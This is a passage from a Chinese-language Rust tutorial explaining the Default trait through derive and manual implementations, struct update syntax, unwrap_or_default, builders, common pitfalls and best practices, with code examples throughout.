<p>所有字段都实现了 <code>Default</code>？直接 <code>#[derive(Default)]</code>：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[derive(Default)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Config</span> {
    host: <span class="hljs-type">String</span>,      <span class="hljs-comment">// ""</span>
    port: <span class="hljs-type">u16</span>,         <span class="hljs-comment">// 0</span>
    timeout: <span class="hljs-type">u64</span>,      <span class="hljs-comment">// 0</span>
    debug: <span class="hljs-type">bool</span>,       <span class="hljs-comment">// false</span>
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">config</span> = Config::<span class="hljs-title function_ invoke__">default</span>();
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}:{}"</span>, config.host, config.port);  <span class="hljs-comment">// :0</span>
}
</code></pre>
<p>编译器帮你生成的代码：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">impl</span> <span class="hljs-title class_">Default</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Config</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">default</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        Config {
            host: <span class="hljs-built_in">Default</span>::<span class="hljs-title function_ invoke__">default</span>(),
            port: <span class="hljs-built_in">Default</span>::<span class="hljs-title function_ invoke__">default</span>(),
            timeout: <span class="hljs-built_in">Default</span>::<span class="hljs-title function_ invoke__">default</span>(),
            debug: <span class="hljs-built_in">Default</span>::<span class="hljs-title function_ invoke__">default</span>(),
        }
    }
}
</code></pre>
<h3 data-id="heading-6">手动实现：自定义更合理的默认值</h3>
<p>派生的默认值太傻？自己写一个：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">ServerConfig</span> {
    host: <span class="hljs-type">String</span>,
    port: <span class="hljs-type">u16</span>,
    max_connections: <span class="hljs-type">usize</span>,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Default</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">ServerConfig</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">default</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        ServerConfig {
            host: <span class="hljs-string">"localhost"</span>.<span class="hljs-title function_ invoke__">to_string</span>(),  <span class="hljs-comment">// 不是空字符串</span>
            port: <span class="hljs-number">8080</span>,                      <span class="hljs-comment">// 不是 0</span>
            max_connections: <span class="hljs-number">100</span>,            <span class="hljs-comment">// 合理的业务默认值</span>
        }
    }
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">config</span> = ServerConfig::<span class="hljs-title function_ invoke__">default</span>();
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"服务器: {}:{}"</span>, config.host, config.port);  <span class="hljs-comment">// localhost:8080</span>
}
</code></pre>
<h2 data-id="heading-7">Default 的 5 个实战场景</h2>
<h3 data-id="heading-8">场景 1：结构体更新语法（最常用）</h3>
<p><strong>痛点</strong>：创建结构体时，大部分字段用默认值，只想改几个。</p>
<p><strong>解决方案</strong>：用 <code>..Default::default()</code> 语法，只写你关心的字段。</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[derive(Default)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">User</span> {
    name: <span class="hljs-type">String</span>,
    age: <span class="hljs-type">u32</span>,
    email: <span class="hljs-type">String</span>,
    active: <span class="hljs-type">bool</span>,
    role: <span class="hljs-type">String</span>,
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-comment">// 只设置需要的字段，其他用默认值</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">user</span> = User {
        name: <span class="hljs-string">"张三"</span>.<span class="hljs-title function_ invoke__">to_string</span>(),
        email: <span class="hljs-string">"zhangsan@example.com"</span>.<span class="hljs-title function_ invoke__">to_string</span>(),
        ..<span class="hljs-built_in">Default</span>::<span class="hljs-title function_ invoke__">default</span>()  <span class="hljs-comment">// age=0, active=false, role=""</span>
    };
    
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}, {}, {}"</span>, user.name, user.age, user.active);
    <span class="hljs-comment">// 张三, 0, false</span>
}
</code></pre>
<p><strong>配置对象更爽</strong>：20 个字段只改 2 个，省了 18 行代码。</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[derive(Default)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">HttpClient</span> {
    timeout: <span class="hljs-type">u64</span>,
    retries: <span class="hljs-type">u32</span>,
    user_agent: <span class="hljs-type">String</span>,
    follow_redirects: <span class="hljs-type">bool</span>,
    <span class="hljs-comment">// ... 还有很多字段</span>
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">client</span> = HttpClient {
        timeout: <span class="hljs-number">30</span>,
        retries: <span class="hljs-number">3</span>,
        ..<span class="hljs-built_in">Default</span>::<span class="hljs-title function_ invoke__">default</span>()  <span class="hljs-comment">// 其他字段都是默认值</span>
    };
}
</code></pre>
<h3 data-id="heading-9">场景 2：Option 兜底值</h3>
<p><strong>痛点</strong>：<code>Option</code> 是 <code>None</code> 时，需要一个兜底值。</p>
<p><strong>解决方案</strong>：<code>unwrap_or_default()</code> 一行搞定。</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">get_port</span>(config: <span class="hljs-type">Option</span>&lt;<span class="hljs-type">u16</span>&gt;) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">u16</span> {
    config.<span class="hljs-title function_ invoke__">unwrap_or_default</span>()  <span class="hljs-comment">// None 时返回 0</span>
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}"</span>, <span class="hljs-title function_ invoke__">get_port</span>(<span class="hljs-title function_ invoke__">Some</span>(<span class="hljs-number">8080</span>)));  <span class="hljs-comment">// 8080</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}"</span>, <span class="hljs-title function_ invoke__">get_port</span>(<span class="hljs-literal">None</span>));        <span class="hljs-comment">// 0</span>
}
</code></pre>
<p><strong>实战例子</strong>：HashMap 查不到时返回默认值。</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::collections::HashMap;

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">scores</span> = HashMap::<span class="hljs-title function_ invoke__">new</span>();
    scores.<span class="hljs-title function_ invoke__">insert</span>(<span class="hljs-string">"Alice"</span>, <span class="hljs-number">95</span>);
    
    <span class="hljs-comment">// Bob 不存在，返回默认值 0</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">bob_score</span> = scores.<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">"Bob"</span>).<span class="hljs-title function_ invoke__">copied</span>().<span class="hljs-title function_ invoke__">unwrap_or_default</span>();
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Bob 的分数: {}"</span>, bob_score);  <span class="hljs-comment">// 0</span>
}
</code></pre>
<h3 data-id="heading-10">场景 3：泛型函数</h3>
<p><strong>用途</strong>：写通用函数时，让调用者决定默认值是什么。</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">create_or_default</span>&lt;T: <span class="hljs-built_in">Default</span>&gt;(value: <span class="hljs-type">Option</span>&lt;T&gt;) <span class="hljs-punctuation">-&gt;</span> T {
    value.<span class="hljs-title function_ invoke__">unwrap_or_default</span>()
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">s</span>: <span class="hljs-type">String</span> = <span class="hljs-title function_ invoke__">create_or_default</span>(<span class="hljs-literal">None</span>);      <span class="hljs-comment">// ""</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">v</span>: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">i32</span>&gt; = <span class="hljs-title function_ invoke__">create_or_default</span>(<span class="hljs-literal">None</span>);    <span class="hljs-comment">// []</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">n</span>: <span class="hljs-type">i32</span> = <span class="hljs-title function_ invoke__">create_or_default</span>(<span class="hljs-title function_ invoke__">Some</span>(<span class="hljs-number">42</span>));     <span class="hljs-comment">// 42</span>
    
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}, {:?}, {}"</span>, s, v, n);  <span class="hljs-comment">// , [], 42</span>
}
</code></pre>
<h3 data-id="heading-11">场景 4：Builder 模式</h3>
<p><strong>用途</strong>：Builder 从默认值开始，链式调用修改需要的字段。</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[derive(Default)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">QueryBuilder</span> {
    table: <span class="hljs-type">String</span>,
    limit: <span class="hljs-type">usize</span>,
    offset: <span class="hljs-type">usize</span>,
    order_by: <span class="hljs-type">String</span>,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">QueryBuilder</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        <span class="hljs-keyword">Self</span>::<span class="hljs-title function_ invoke__">default</span>()  <span class="hljs-comment">// 从默认值开始</span>
    }
    
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">table</span>(<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>, table: &amp;<span class="hljs-type">str</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        <span class="hljs-keyword">self</span>.table = table.<span class="hljs-title function_ invoke__">to_string</span>();
        <span class="hljs-keyword">self</span>
    }
    
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">limit</span>(<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>, limit: <span class="hljs-type">usize</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        <span class="hljs-keyword">self</span>.limit = limit;
        <span class="hljs-keyword">self</span>
    }
    
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">build</span>(<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">String</span> {
        <span class="hljs-built_in">format!</span>(<span class="hljs-string">"SELECT * FROM {} LIMIT {}"</span>, <span class="hljs-keyword">self</span>.table, <span class="hljs-keyword">self</span>.limit)
    }
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">query</span> = QueryBuilder::<span class="hljs-title function_ invoke__">new</span>()
        .<span class="hljs-title function_ invoke__">table</span>(<span class="hljs-string">"users"</span>)
        .<span class="hljs-title function_ invoke__">limit</span>(<span class="hljs-number">10</span>)
        .<span class="hljs-title function_ invoke__">build</span>();
    
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}"</span>, query);  <span class="hljs-comment">// SELECT * FROM users LIMIT 10</span>
}
</code></pre>
<h3 data-id="heading-12">场景 5：批量初始化数组</h3>
<p><strong>用途</strong>：创建固定大小的数组，所有元素都是默认值。</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-comment">// 5 个空字符串</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">array</span>: [<span class="hljs-type">String</span>; <span class="hljs-number">5</span>] = <span class="hljs-built_in">Default</span>::<span class="hljs-title function_ invoke__">default</span>();
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{:?}"</span>, array);  <span class="hljs-comment">// ["", "", "", "", ""]</span>
    
    <span class="hljs-comment">// 10 个计数器，初始值都是 0</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">counters</span>: [<span class="hljs-type">i32</span>; <span class="hljs-number">10</span>] = <span class="hljs-built_in">Default</span>::<span class="hljs-title function_ invoke__">default</span>();
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{:?}"</span>, counters);  <span class="hljs-comment">// [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</span>
}
</code></pre>
<h2 data-id="heading-13">4 个常见坑</h2>
<h3 data-id="heading-14">坑 1：默认值不一定合理</h3>
<p><strong>问题</strong>：派生的默认值可能在业务上没意义。</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[derive(Default)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Rectangle</span> {
    width: <span class="hljs-type">u32</span>,   <span class="hljs-comment">// 默认 0</span>
    height: <span class="hljs-type">u32</span>,  <span class="hljs-comment">// 默认 0</span>
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">area</span>(rect: &amp;Rectangle) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">u32</span> {
    rect.width * rect.height
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">rect</span> = Rectangle::<span class="hljs-title function_ invoke__">default</span>();
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"面积: {}"</span>, <span class="hljs-title function_ invoke__">area</span>(&amp;rect));  <span class="hljs-comment">// 0，一个面积为 0 的矩形？</span>
}
</code></pre>
<p><strong>怎么办</strong>：</p>
<p>方案 1：手动实现合理的默认值</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">impl</span> <span class="hljs-title class_">Default</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Rectangle</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">default</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        Rectangle { width: <span class="hljs-number">1</span>, height: <span class="hljs-number">1</span> }  <span class="hljs-comment">// 至少是个正方形</span>
    }
}
</code></pre>
<p>方案 2：别实现 Default，强制用构造函数</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">impl</span> <span class="hljs-title class_">Rectangle</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>(width: <span class="hljs-type">u32</span>, height: <span class="hljs-type">u32</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        Rectangle { width, height }
    }
}
</code></pre>
<h3 data-id="heading-15">坑 2：有些字段没有 Default</h3>
<p><strong>问题</strong>：结构体里有个字段没实现 Default，派生就会报错。</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">User</span> {
    id: <span class="hljs-type">u64</span>,
    name: <span class="hljs-type">String</span>,
    created_at: std::time::SystemTime,  <span class="hljs-comment">// SystemTime 没有 Default！</span>
}

<span class="hljs-comment">// 编译错误！</span>
<span class="hljs-comment">// #[derive(Default)]</span>
</code></pre>
<p><strong>怎么办</strong>：手动实现，给那个字段一个合理的默认值。</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">impl</span> <span class="hljs-title class_">Default</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">User</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">default</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        User {
            id: <span class="hljs-number">0</span>,
            name: <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">new</span>(),
            created_at: std::time::SystemTime::<span class="hljs-title function_ invoke__">now</span>(),  <span class="hljs-comment">// 用当前时间</span>
        }
    }
}
</code></pre>
<h3 data-id="heading-16">坑 3：Default 和 new 别搞混</h3>
<p><strong>问题</strong>：一个类型同时有 <code>new()</code> 和 <code>default()</code>，容易搞混。</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Config</span> {
    value: <span class="hljs-type">i32</span>,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Config</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>(value: <span class="hljs-type">i32</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        Config { value }
    }
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Default</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Config</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">default</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        Config { value: <span class="hljs-number">42</span> }
    }
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">c1</span> = Config::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-number">10</span>);      <span class="hljs-comment">// value = 10</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">c2</span> = Config::<span class="hljs-title function_ invoke__">default</span>();    <span class="hljs-comment">// value = 42</span>
    <span class="hljs-comment">// 两个方法，两个不同的值，容易搞混</span>
}
</code></pre>
<p><strong>记住这个约定</strong>：</p>




















<table><thead><tr><th>方法</th><th>用途</th><th>示例</th></tr></thead><tbody><tr><td><code>new()</code></td><td>必须提供参数</td><td><code>Database::new(url)</code></td></tr><tr><td><code>default()</code></td><td>零参数，合理的默认值</td><td><code>Logger::default()</code></td></tr></tbody></table>
<p>如果类型必须提供参数才有意义（比如数据库连接必须有 URL），就别实现 Default。</p>
<h3 data-id="heading-17">坑 4：字段有依赖关系时别派生</h3>
<p><strong>问题</strong>：字段之间有逻辑关系，派生的 Default 不会处理。</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[derive(Default)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Cache</span> {
    data: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">String</span>&gt;,
    count: <span class="hljs-type">usize</span>,  <span class="hljs-comment">// 应该等于 data.len()，但派生的默认值是 0</span>
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">cache</span> = Cache::<span class="hljs-title function_ invoke__">default</span>();
    <span class="hljs-comment">// cache.data.len() = 0</span>
    <span class="hljs-comment">// cache.count = 0</span>
    <span class="hljs-comment">// 现在还一致，但如果 data 有初始值就不一致了</span>
}
</code></pre>
<p><strong>更明显的例子</strong>：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[derive(Default)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Buffer</span> {
    data: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">u8</span>&gt;,
    capacity: <span class="hljs-type">usize</span>,  <span class="hljs-comment">// 默认 0，但 Vec 的 capacity 可能不是 0</span>
}
</code></pre>
<p><strong>怎么办</strong>：手动实现，保证字段之间的一致性。</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">impl</span> <span class="hljs-title class_">Default</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Cache</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">default</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">data</span> = <span class="hljs-type">Vec</span>::<span class="hljs-title function_ invoke__">new</span>();
        Cache {
            count: data.<span class="hljs-title function_ invoke__">len</span>(),  <span class="hljs-comment">// 保证一致</span>
            data,
        }
    }
}
</code></pre>
<h2 data-id="heading-18">5 条最佳实践</h2>
<h3 data-id="heading-19">1. 能派生就派生</h3>
<p><strong>原则</strong>：简单类型直接派生，需要自定义默认值才手动实现。</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// ✅ 简单类型：派生</span>
<span class="hljs-meta">#[derive(Default)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Point</span> {
    x: <span class="hljs-type">i32</span>,
    y: <span class="hljs-type">i32</span>,
}

<span class="hljs-comment">// ✅ 需要合理默认值：手动实现</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Config</span> {
    port: <span class="hljs-type">u16</span>,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Default</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Config</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">default</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        Config { port: <span class="hljs-number">8080</span> }  <span class="hljs-comment">// 不是 0</span>
    }
}
</code></pre>
<h3 data-id="heading-20">2. 配合 <code>..Default::default()</code> 语法</h3>
<p><strong>技巧</strong>：这是 Default 最常用的场景，省代码神器。</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[derive(Default)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Settings</span> {
    theme: <span class="hljs-type">String</span>,
    font_size: <span class="hljs-type">u32</span>,
    auto_save: <span class="hljs-type">bool</span>,
    <span class="hljs-comment">// ... 很多字段</span>
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">settings</span> = Settings {
        theme: <span class="hljs-string">"dark"</span>.<span class="hljs-title function_ invoke__">to_string</span>(),
        ..<span class="hljs-built_in">Default</span>::<span class="hljs-title function_ invoke__">default</span>()  <span class="hljs-comment">// 其他字段用默认值</span>
    };
}
</code></pre>
<h3 data-id="heading-21">3. 公共 API 最好提供 Default</h3>
<p><strong>原因</strong>：让用户更方便，不用记住每个字段的初始值。</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// ✅ 用户友好</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">client</span> = HttpClient::<span class="hljs-title function_ invoke__">default</span>();

<span class="hljs-comment">// ❌ 用户痛苦</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">client</span> = HttpClient {
    timeout: <span class="hljs-number">0</span>,
    retries: <span class="hljs-number">0</span>,
    user_agent: <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">new</span>(),
    follow_redirects: <span class="hljs-literal">false</span>,
    <span class="hljs-comment">// ... 还有 10 个字段</span>
};
</code></pre>
<h3 data-id="heading-22">4. 文档里写清楚默认值</h3>
<p><strong>重要</strong>：如果默认值不是 0 或空，一定要在文档里说明。</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">/// HTTP 客户端配置</span>
<span class="hljs-comment">///</span>
<span class="hljs-comment">/// # 默认值</span>
<span class="hljs-comment">/// - `timeout`: 30 秒</span>
<span class="hljs-comment">/// - `retries`: 3 次</span>
<span class="hljs-comment">/// - `user_agent`: "MyApp/1.0"</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">HttpClientConfig</span> {
    timeout: <span class="hljs-type">u64</span>,
    retries: <span class="hljs-type">u32</span>,
    user_agent: <span class="hljs-type">String</span>,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Default</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">HttpClientConfig</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">default</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        HttpClientConfig {
            timeout: <span class="hljs-number">30</span>,
            retries: <span class="hljs-number">3</span>,
            user_agent: <span class="hljs-string">"MyApp/1.0"</span>.<span class="hljs-title function_ invoke__">to_string</span>(),
        }
    }
}
</code></pre>
<h3 data-id="heading-23">5. Default vs new 怎么选</h3>
<p><strong>决策树</strong>：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// 情况 1：必须提供参数 → 只提供 new()</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Database</span> {
    url: <span class="hljs-type">String</span>,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Database</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>(url: <span class="hljs-type">String</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        Database { url }
    }
}
<span class="hljs-comment">// 没有 Default，因为没有合理的默认 URL</span>

<span class="hljs-comment">// 情况 2：有合理的默认值 → 提供 Default</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Logger</span> {
    level: <span class="hljs-type">String</span>,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Default</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Logger</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">default</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        Logger {
            level: <span class="hljs-string">"info"</span>.<span class="hljs-title function_ invoke__">to_string</span>(),
        }
    }
}

<span class="hljs-comment">// 情况 3：两者都有 → 都提供</span>
<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Logger</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>(level: <span class="hljs-type">String</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        Logger { level }
    }
}
</code></pre>
<p><strong>快速判断</strong>：</p>

























<table><thead><tr><th>情况</th><th>提供什么</th><th>示例</th></tr></thead><tbody><tr><td>必须有参数才有意义</td><td>只提供 <code>new()</code></td><td>数据库连接（必须有 URL）</td></tr><tr><td>有合理的零参数默认值</td><td>提供 <code>Default</code></td><td>日志器（默认 info 级别）</td></tr><tr><td>两者都合理</td><td>都提供</td><td>配置对象（可以全默认，也可以自定义）</td></tr></tbody></table>
<h2 data-id="heading-24">和其他 trait 一起用</h2>
<p>Default 经常和其他 trait 组合派生，下面是常见搭配：</p>
<p><strong>Default + Clone</strong>：创建默认实例后可以克隆</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[derive(Default, Clone)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Config</span> {
    value: <span class="hljs-type">i32</span>,
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">c1</span> = Config::<span class="hljs-title function_ invoke__">default</span>();
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">c2</span> = c1.<span class="hljs-title function_ invoke__">clone</span>();  <span class="hljs-comment">// 克隆默认配置</span>
}
</code></pre>
<p><strong>Default + Debug</strong>：方便调试默认值</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[derive(Default, Debug)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Point</span> {
    x: <span class="hljs-type">i32</span>,
    y: <span class="hljs-type">i32</span>,
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">p</span> = Point::<span class="hljs-title function_ invoke__">default</span>();
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{:?}"</span>, p);  <span class="hljs-comment">// Point { x: 0, y: 0 }</span>
}
</code></pre>
<p><strong>Default + PartialEq</strong>：测试时验证默认值</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[derive(Default, PartialEq)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Data</span> {
    value: <span class="hljs-type">i32</span>,
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">d1</span> = Data::<span class="hljs-title function_ invoke__">default</span>();
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">d2</span> = Data { value: <span class="hljs-number">0</span> };
    <span class="hljs-built_in">assert_eq!</span>(d1, d2);  <span class="hljs-comment">// 默认值和手动构造的相等</span>
}
</code></pre>
<blockquote>
<p><strong>常见组合</strong>：<code>#[derive(Default, Debug, Clone, PartialEq)]</code> 是配置类型的标配。</p>
</blockquote>
<h2 data-id="heading-25">总结</h2>
<p>Default 就三句话：</p>
<ol>
<li><strong>一个方法</strong>：<code>default()</code> 返回合理的默认值</li>
<li><strong>一个语法</strong>：<code>..Default::default()</code> 省掉 90% 的初始化代码</li>
<li><strong>一个原则</strong>：默认值要「安全且合理」，不是随便给个 0</li>
</ol>
<p><strong>记住</strong>：能派生就派生，需要自定义就手动实现。配置对象、Builder 模式、Option 兜底，Default 都能帮你省代码。</p>
